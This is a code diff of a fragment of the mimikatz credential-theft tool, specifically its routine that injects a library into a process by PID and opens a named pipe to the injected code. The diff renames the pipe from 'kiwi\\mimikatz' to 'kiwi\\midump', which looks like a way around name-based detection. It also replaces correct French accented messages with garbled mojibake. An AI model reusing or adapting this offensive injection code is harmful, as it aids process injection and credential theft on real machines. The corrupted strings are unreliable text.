@@ -75,12 +75,12 @@ bool mod_mimikatz_inject::injectInPid(DWORD & pid, wstring & libPath, bool isCom
 			{
 				wstring monBuffer = L"";
 
-				monCommunicator = new mod_pipe(L"kiwi\\mimikatz");
+				monCommunicator = new mod_pipe(L"kiwi\\midump");
 				(*outputStream) << L"Attente de connexion du client..." << endl;
 
 				if(monCommunicator->createServer())
 				{
-					(*outputStream) << L"Serveur connecté à un client !" << endl;
+					(*outputStream) << L"Serveur connectï¿½ ï¿½ un client !" << endl;
 					if(monCommunicator->readFromPipe(monBuffer))
 					{
 						(*outputStream) << L"Message du processus :" << endl << monBuffer << endl;
@@ -93,15 +93,15 @@ bool mod_mimikatz_inject::injectInPid(DWORD & pid, wstring & libPath, bool isCom
 				}
 				else
 				{
-					(*outputStream) << L"Erreur : Impossible de créer un canal de communication ! ; " << mod_system::getWinError() << endl;
+					(*outputStream) << L"Erreur : Impossible de crï¿½er un canal de communication ! ; " << mod_system::getWinError() << endl;
 					closeThisCommunicator();
 				}
 			}
 			else
-				(*outputStream) << L"Injecté sans communication (legacy)" << endl;
+				(*outputStream) << L"Injectï¿½ sans communication (legacy)" << endl;
 		} else (*outputStream) << L"Erreur : Impossible d\'injecter ! ; " << mod_system::getWinError() << endl;
 	}
-	else (*outputStream) << L"Erreur : un canal de communicaton est déjà ouvert" << endl;
+	else (*outputStream) << L"Erreur : un canal de communicaton est dï¿½jï¿½ ouvert" << endl;
 
 	return reussite;
 }
